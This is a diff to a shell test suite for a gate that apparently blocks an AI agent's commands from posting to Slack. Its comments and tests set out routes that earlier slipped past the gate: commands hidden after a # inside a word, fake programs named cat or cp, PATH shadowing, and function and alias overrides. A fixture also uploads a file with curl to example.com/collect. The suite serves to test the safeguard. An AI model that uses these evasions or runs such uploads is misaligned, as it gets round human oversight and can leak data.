@@ -25,6 +25,10 @@
 #   * an error inside either reading refuses the call (seen to fail against a copy of the gate
 #     that swallowed the error, on 2026-11-22);
 #   * a script read once and found clean is read again when it is handed other words.
+#
+# The last section holds the words of a refusal #3395 left as it was: a script handed a file that
+# only names the send call is refused as a check that could not be made, never as a post found
+# (claude-config#3410).
 set -uo pipefail
 
 # Its own wall clock, and whatever it starts stopped with it however it ends (claude-config#465).
@@ -278,6 +282,20 @@ hashed "a sourced file after a # in single quotes" "echo 'see # 3'; . lib/shifte
 hashed "a sourced file after a # in double quotes" 'echo "see # 3"; . lib/shifter.sh'
 plain "a shift in a case branch" 'case "$MODE" in "a b") shift ;; esac' "calm hot"
 hashed "a shift after a # in a quoted case pattern" 'case "$MODE" in "a # b") shift ;; esac'
+# A command that posts, written after a # of the two kinds the shell keeps inside a word, in a
+# script run with a $1 whose file does not post. The reader took such a # for a comment and left the
+# rest of its line out (claude-config#3464), so the post is what must be found, by the reader
+# reading that line as the shell does.
+# Seen to fail on 2026-11-23 against main as it was at e3c530797c: both scripts passed (exit 0).
+posted() {
+  Q=$((Q + 1))
+  printf '%s\n' "$2" "$READS" > "$G/q3451-$Q.sh"
+  run "bash q3451-$Q.sh calm"
+  refused "#3464 $1 is refused, though the file under \$1 does not post"
+  says "#3464 $1 is refused as the post it is" "$FOUND"
+}
+posted "a post after a # that an escaped space joins to its word" 'echo see\ # 3; '"$POST"
+posted "a post after a # that a line joined by a backslash puts inside a word" 'echo see\'$'\n''#3; '"$POST"
 
 # A real comment is still left out, so the words in it end nothing (the control that must not
 # change: each of these passed and was refused the same way before this reading was changed).
@@ -296,6 +314,13 @@ reads "a line that is only a comment naming shift, eval and a loop" '# shift the
 reads "a comment inside a substitution that spans lines" 'X="$(' '  # shift nothing here' '  echo ok' ')"'
 reads "a # inside a word, with no comment and no shift after it," 'echo a#b $# ${#X}'
 reads "a comment after a quoted string that holds a #" "echo 'see # 3' # shift 3"
+# Where a comment starts is asked of the reader's one rule (lib/shell-words.py word_starts), which
+# counts the backslashes: two before a space are an escaped backslash and the # after them starts a
+# comment, as it does on a line joined after a space. The pattern this reading had of its own took
+# any backslash before the white space for an escape, so the shift named in these comments ended
+# what was certain. Seen to fail on 2026-11-23 against that pattern: both were refused with calm.
+reads "a comment after two backslashes and a space" 'echo see\\ # shift 3; set -- hot'
+reads "a comment on a line joined after a space" 'echo see \'$'\n''# shift 3; set -- hot'
 
 echo "slack drafts only: a script's \$0 and \$1 are taken up only where a sourced path needs them (claude-config#3395)"
 # Seen to fail on 2026-11-22 against the first form of this change, which gave every command of a
@@ -639,6 +664,102 @@ else
   echo "SUITE-PART-UNMEASURED #3395: git show of a commit's file: git could not make a repository with one commit under $T"
 fi
 
+echo "slack drafts only: what cat, cp, tee and the rest write is believed only of the system's own program (claude-config#3440)"
+# The gate's own older readings took a program by the last part of its word too: what printf, echo
+# and cat print, into a file or down a pipe, what cp, mv, ln, install and link copy, and what tee
+# writes. Every command below marked NEW was ALLOWED on this change's base (a49e2ec940,
+# 2026-11-22): the scripts named for those programs here print a line that posts, and the gate read
+# calm.sh as what the file that is then run held. They are refused now as a check that could not
+# be made, by the one judgement lib/exact-output.py already made for sed and git (system_program).
+# echo and printf by their bare names are the shell's own builtins, which PATH does not move.
+# Not held here, and still believed by name: what dd, tar, unzip, sed -i, awk, a git checkout and a
+# compiler write (lib/program-writes.py note_program), seen allowed the same way on that base.
+M="$T/same3440"
+mkdir -p "$M/bin"
+printf '%s\n' '#!/bin/sh' "echo '$POST'" > "$M/cat"
+for n in cp mv ln install link tee echo printf bin/cat; do cp "$M/cat" "$M/$n"; done
+chmod +x "$M/cat" "$M/cp" "$M/mv" "$M/ln" "$M/install" "$M/link" "$M/tee" "$M/echo" "$M/printf" "$M/bin/cat"
+printf '%s\n' 'echo ok' > "$M/calm.sh"
+printf '%s\n' "$POST" > "$M/posts.sh"
+printf '%s\n' 'cat calm.sh > made.sh' 'bash made.sh' > "$M/copy.sh"
+printf '%s\n' "PATH=$M:\$PATH" 'cat calm.sh > made.sh' 'bash made.sh' > "$M/path-copy.sh"
+printf '%s\n' './cp calm.sh made.sh' 'bash made.sh' > "$M/local-copy.sh"
+printf '%s\n' 'cp calm.sh made.sh' 'bash made.sh' > "$M/copy-run.sh"
+mkdir -p "$M/into"
+printf '%s\n' './cat posts.sh | bash' > "$M/local-feed.sh"
+CR="calm.sh > run.sh; bash run.sh"
+found40() { refused "#3440 $1 is refused"; says "#3440 $1: as a post found" "$FOUND"; }
+unsure() { refused "#3440 $1 is refused"; says "#3440 $1: as a check that could not be made" "REFUSED: $UNREAD"; }
+still() { allowed "#3440 $1 still passes"; }
+run_path40() { local keep="$PATH"; export PATH="$1"; run "$2" "$3"; export PATH="$keep"; }
+# The plain forms, read as before.
+run "cat $CR" "$M";                                still "cat by its bare name, of a file that does not post,"
+run "cat posts.sh > run.sh; bash run.sh" "$M";     found40 "cat by its bare name, of a file that posts,"
+run "/bin/cat $CR" "$M";                           still "cat by its path in a system folder"
+run "/bin/cat posts.sh > run.sh; bash run.sh" "$M"; found40 "cat by its path in a system folder, of a file that posts,"
+run "cp calm.sh run.sh; bash run.sh" "$M";         still "cp by its bare name"
+run "cp posts.sh run.sh; bash run.sh" "$M";        found40 "cp by its bare name, of a file that posts,"
+run "/bin/cp calm.sh run.sh; bash run.sh" "$M";    still "cp by its path in a system folder"
+run "mv calm.sh run.sh; bash run.sh" "$M";         still "mv by its bare name"
+run "cat calm.sh | tee run.sh; bash run.sh" "$M";  still "tee by its bare name"
+run "cat posts.sh | tee run.sh; bash run.sh" "$M"; found40 "tee by its bare name, fed a file that posts,"
+run "cat calm.sh | bash" "$M";                     still "cat by its bare name into a shell"
+run "cat posts.sh | bash" "$M";                    found40 "cat of a file that posts into a shell"
+run "echo 'echo ok' > run.sh; bash run.sh" "$M";   still "echo by its bare name"
+run "printf 'echo ok\n' > run.sh; bash run.sh" "$M"; still "printf by its bare name"
+run "export PATH=$M:\$PATH; echo 'echo ok' > run.sh; bash run.sh" "$M"
+still "echo after PATH is exported, which is the shell's own echo whatever PATH holds,"
+run "export PATH=$M:\$PATH; printf '%s\n' '$POST' > run.sh; bash run.sh" "$M"
+found40 "printf of a line that posts, after PATH is exported,"
+run "bash copy.sh" "$M";                           still "a script that runs what its cat wrote, with PATH left alone,"
+# NEW: a path that is not one of the system's folders.
+run "./cat $CR" "$M";                              unsure "a script named cat, run by its path in the folder,"
+run "$M/cat $CR" "$M";                             unsure "a script named cat, run by a whole path outside the system's folders,"
+run "bin/cat $CR" "$M";                            unsure "a script named cat, run by a path under the folder,"
+run "./cp calm.sh run.sh; bash run.sh" "$M";       unsure "a script named cp"
+run "./cp calm.sh into/; bash into/calm.sh" "$M";  unsure "a script named cp, copying into a folder,"
+run "./cp calm.sh run.sh; bash calm.sh" "$M";      unsure "a script named cp, for the file it was handed to copy from,"
+run "cp calm.sh run.sh; bash calm.sh" "$M";        still "the system's cp, for the file it copied from,"
+run "./mv calm.sh run.sh; bash run.sh" "$M";       unsure "a script named mv"
+run "./ln -s calm.sh run.sh; bash run.sh" "$M";    unsure "a script named ln"
+run "./install calm.sh run.sh; bash run.sh" "$M";  unsure "a script named install"
+run "./link calm.sh run.sh; bash run.sh" "$M";     unsure "a script named link"
+run "cat calm.sh | ./tee run.sh; bash run.sh" "$M"; unsure "a script named tee"
+run "./cat calm.sh | tee run.sh; bash run.sh" "$M"; unsure "a script named cat feeding the system's tee"
+run "./echo 'echo ok' > run.sh; bash run.sh" "$M"; unsure "a script named echo, run by its path,"
+run "./printf 'echo ok\n' > run.sh; bash run.sh" "$M"; unsure "a script named printf, run by its path,"
+run "./cat calm.sh | bash" "$M";                   unsure "a script named cat piped into a shell"
+# NEW: PATH named in the command, or in a text that runs it.
+run "PATH=$M:\$PATH; cat $CR" "$M";                unsure "cat after PATH is set"
+run "export PATH=$M:\$PATH; cat $CR" "$M";         unsure "cat after PATH is exported"
+run "cat $CR; PATH=$M:\$PATH" "$M";                unsure "cat in a command that sets PATH anywhere"
+run "export PATH=$M:\$PATH; cp calm.sh run.sh; bash run.sh" "$M"; unsure "cp after PATH is exported"
+run "export PATH=$M:\$PATH; cat calm.sh | tee run.sh; bash run.sh" "$M"; unsure "tee after PATH is exported"
+run "export PATH=$M:\$PATH; cat calm.sh | bash" "$M"; unsure "cat piped into a shell after PATH is exported"
+run "export PATH=$M:\$PATH; bash copy.sh" "$M";    refused "#3440 a script whose caller exported PATH, running what its cat wrote, is refused"
+run "export PATH=$M:\$PATH; bash copy-run.sh" "$M"; refused "#3440 a script whose caller exported PATH, running what its cp copied, is refused"
+# PATH named in the text of a script on disk is not counted for these readings (system_program in
+# lib/exact-output.py says why: counted on 2026-11-22, 160 of this repository's 315 suites name
+# PATH, and most make a file with cat or cp and then run it). So this still passes, as it did, and
+# is left for its own change.
+run "bash path-copy.sh" "$M";                      still "a script on disk that names PATH and runs what its cat wrote"
+# In a script on disk, and a post in what the system's program would have written is still found.
+run "bash local-copy.sh" "$M";                     refused "#3440 a script on disk that runs what a script named cp copied is refused"
+run "bash local-feed.sh" "$M";                     found40 "a script on disk that pipes a file that posts through a script named cat into a shell"
+run "./cat posts.sh > run.sh; bash run.sh" "$M";   refused "#3440 a script named cat, of a file that posts, is still refused"
+run "./cat posts.sh | bash" "$M";                  found40 "a script named cat, of a file that posts, piped into a shell"
+run "./cp posts.sh run.sh; bash run.sh" "$M";      refused "#3440 a script named cp, of a file that posts, is still refused"
+# NEW: a word in front that runs it for the shell, a function or an alias of the name.
+run "command cat $CR" "$M";                        unsure "cat behind command"
+run "cat() { /bin/echo '$POST'; }; cat $CR" "$M";  refused "#3440 a function named cat, whose output is run, is refused"
+run "alias cat=./cat; cat $CR" "$M";               refused "#3440 an alias named cat, whose output is run, is refused"
+run "echo() { /bin/echo '$POST'; }; echo 'echo ok' > run.sh; bash run.sh" "$M"
+refused "#3440 a function named echo, whose output is run, is refused"
+# NEW: the session's own PATH, where an entry is the folder the command runs in.
+run_path40 ".:$PATH" "cat $CR" "$M";               unsure "cat where the session's PATH holds the folder itself"
+run_path40 "$PATH:" "cp calm.sh run.sh; bash run.sh" "$M"; unsure "cp where the session's PATH ends with an empty entry"
+run_path40 ".:$PATH" "echo 'echo ok' > run.sh; bash run.sh" "$M"; still "echo where the session's PATH holds the folder itself"
+
 echo "slack drafts only: an error inside either reading refuses the call (claude-config#3395)"
 # A copy of the gate whose two readings raise when the command holds a marker word. A reading that
 # caught its own errors would let such a call through as one it had nothing to say about.
@@ -692,6 +813,49 @@ run_failing "bash FAILS-3395.sh lib/calm.sh"
 refused "#3395 a reading of a script's words that fails is refused"
 says "#3395 and that refusal says the call could not be judged" "could not judge"
 reached "#3395 and it is the made failure in the reading of a script's words that refused it" params
+
+echo "slack drafts only: a script handed a file that only names the send call is a check that could not be made (claude-config#3410)"
+# A script not seen to be unable to act, handed a file that only names Slack's send call, is
+# refused as it was (Dan, 2026-11-21, #3218: "Leave it refused, fix the big groups"). No post was
+# found, so the refusal may not say one was (L11): it led with "this command posts to Slack" 55
+# times in the personal MacBook's records of 2026-11-08 to 11-21, and a count by the could not
+# check wording missed every one. Only the words change: every command here is refused or passed
+# as on this change's base (35afab0dba).
+N="$T/n3410"
+mkdir -p "$N"
+lacks() { case "$ERR" in *"$2"*) check "$1" "stderr said '$2': ${ERR:0:400}" ;; *) check "$1" ok ;; esac; }
+printf '%s\n' 'a recorded line that only names chat.postMessage and sends nothing' > "$N/named.txt"
+printf '%s\n' 'NAMES = ("chat.postMessage",)' 'print(len(NAMES))' > "$N/rules.py"
+printf '%s\n' 'import concurrent.futures, sys' 'print(len(open(sys.argv[1]).read()))' > "$N/sweep.py"
+printf '%s\n' 'import json, sys, urllib.request' 'urllib.request.urlopen(json.load(open(sys.argv[1]))["url"])' > "$N/send.py"
+printf '%s\n' 'import sys' 'print(len(open(sys.argv[1]).read()))' > "$N/reads.py"
+printf '%s\n' 'import sys' 'exec(open(sys.argv[1]).read())' > "$N/runit.py"
+printf '%s\n' 'curl -s --data-binary "@$1" https://example.com/collect' > "$N/fetch.sh"
+printf '%s\n' 'frobnicate python3 sweep.py named.txt' > "$N/outer.sh"
+printf '%s\n' 'import urllib.request' 'urllib.request.urlopen("https://slack.com/api/chat.postMessage")' > "$N/poster.py"
+# The last of the five holds that nothing but the words changed. Inside a script on disk, behind a
+# program the gate does not know, a reason recorded as one the walk could not follow is dropped and
+# the script passes (lib/unknown-program.py), so this refusal is recorded apart from those. Seen to
+# fail on 2026-11-22 against a copy of the gate that recorded it with unfollow(): bash outer.sh passed.
+for c in "python3 sweep.py named.txt" "python3 sweep.py rules.py" "python3 send.py named.txt" \
+  "bash fetch.sh named.txt" "bash outer.sh"; do
+  run "$c" "$N"
+  refused "#3410 a script handed a file that only names the send call is still refused: $c"
+  says "#3410 the refusal still names the file and what it names: $c" ", which names chat.postMessage"
+  says "#3410 it says the check could not be made: $c" "REFUSED: $UNREAD"
+  lacks "#3410 and does not claim a post was found: $c" "$FOUND"
+  says "#3410 it says why, that the file only names the endpoint: $c" \
+    "This is not a finding that it posts: the file only names a Slack posting endpoint, and the gate could not tell whether the script sends anything to it"
+  says "#3410 the draft rule is still stated, for a command that does send a message: $c" "slack_send_message_draft"
+done
+run "python3 reads.py named.txt" "$N"
+allowed "#3410 a script that only reads the file it is handed still passes"
+# A file that posts, handed to a script that runs what it is handed, is read as the script it is,
+# and that is still a post found.
+run "python3 runit.py poster.py" "$N"
+refused "#3410 a file that posts, handed to a script that runs what it is handed, is still refused"
+says "#3410 and that is still a post found" "$FOUND"
+lacks "#3410 not a check that could not be made" "$UNREAD"
 
 echo
 
